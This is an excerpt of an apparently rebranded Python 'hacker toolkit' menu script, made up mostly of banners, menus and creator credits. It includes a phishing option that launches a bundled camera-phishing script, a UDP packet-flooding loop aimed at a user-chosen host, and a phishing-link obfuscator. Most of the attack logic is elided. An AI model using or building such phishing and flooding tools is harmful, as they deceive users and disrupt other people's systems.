...
def close_program():
    text_animation(f"\n{Fore.RED} [💀] Closing The Hack-system_from-OFFICIAL_cyber_satyam27...{Style.RESET_ALL}\n", 0.02)
    sys.exit()
...
def menu_intro(section_name):
    ...
    text_animation(f"                                \033[1;37mCreated by \033[1;31mOFFICIAL_CYBER_SATYAM27💻\033[0m\n", 0.0005)
    text_animation(f"{Fore.CYAN} \t\t\t\tTikTok: {Style.RESET_ALL}{Fore.LIGHTBLUE_EX}@_.official_cyber_satyam27._\n\n{Style.RESET_ALL}", 0.0005)
...
def windows():
    ...
    text_animation(title, 0.0005)
    text_animation(f"                                \033[1;37mCreated by \033[1;31mOFFICIAL_cyber_satyam27 💻\033[0m\n", 0.0005)
    text_animation(f"{Fore.CYAN} \t\t\t\tyourube: {Style.RESET_ALL}{Fore.LIGHTBLUE_EX}@OFFICIAL_cyber_satyam27\n{Style.RESET_ALL}", 0.0005)
    
    menu = f"""
        {Fore.GREEN}{Style.BRIGHT}┌{'─'*50}┐
            │{Fore.MAGENTA}{Style.BRIGHT}          L0p27 TOOLKIT - MAIN MENU           {Fore.GREEN}     │
            ├{'─'*50}┤
            ...
            │ {Fore.CYAN}[{Fore.YELLOW}99{Fore.CYAN}] {Fore.YELLOW}Update L0p27 Toolkit                        {Fore.GREEN} │
            └{'─'*50}┘
    """
    print(menu)
...
def run_wpscan():
    try:
        ...
        text_animation(f"                                \033[1;37mCreated by \033[1;31mSRY 💻\033[0m\n", 0.0005)
        text_animation(f"{Fore.CYAN} \t\t\t\tTikTok: {Style.RESET_ALL}{Fore.LIGHTBLUE_EX}@_.SRY_\n\n{Style.RESET_ALL}", 0.0005)
...
def link_mask():
    menu_intro("OFFICIA_CYBER_SATYAM27's Phishing Link Obfuscator")
...
def phishing():
    try:
        ...
        if s == "1":
            os.system("bash .files/.phishing/SRY-CamPhisher/SRY-CamPhisher.sh")
        elif s == "2":
            ...
            try:
                while True:
                    ...
                    if s.sendto(packet, (host, int(port))):
                        ...
                        print(f"\033[92m[{time.ctime()}] Packet sent successfully\033[0m \033[94m<-- OFFICIAL_CYBER_SATYAM27packet -->\033[0m")
                    else:
...
def banner():
    ...
    print("░ ░      ░ ░                     ░  ")
    print("░        ░                      ░   ")
    print("         \033[1;37mCreated by \033[1;31mOFFICIAL_cyber_satyam27\033[0m\n")
...
def main():
    try:
        ...
        text_animation(f"                                \033[1;37mCreated by \033[1;31mOFFICIAL_CYBER_SATYAM#7💻\033[0m\n", 0.0005)
        text_animation(f"{Fore.CYAN} \t\t\t\tTikTok: {Style.RESET_ALL}{Fore.LIGHTBLUE_EX}SRY-OFFICIAL_cyber_satyam27\n{Style.RESET_ALL}", 0.0005)

        menu = f"""
            {Fore.GREEN}{Style.BRIGHT}┌{'─'*50}┐
            │{Fore.MAGENTA}{Style.BRIGHT}          SRY TOOLKIT - MAIN MENU           {Fore.GREEN}     │
            ├{'─'*50}┤
            ...
            ├{'─'*50}┤
            │ {Fore.CYAN}[{Fore.RED}0{Fore.CYAN}] {Fore.LIGHTRED_EX}Exit                                      {Fore.GREEN}   │
            │ {Fore.CYAN}[{Fore.YELLOW}99{Fore.CYAN}] {Fore.YELLOW}Update OFFICIAL_cyber_satyam27 Toolkit                        {Fore.GREEN} │
            └{'─'*50}┘
        """
        print(menu)
        s = input(f"{Fore.GREEN} root@{username}:~$ {Style.RESET_ALL}")
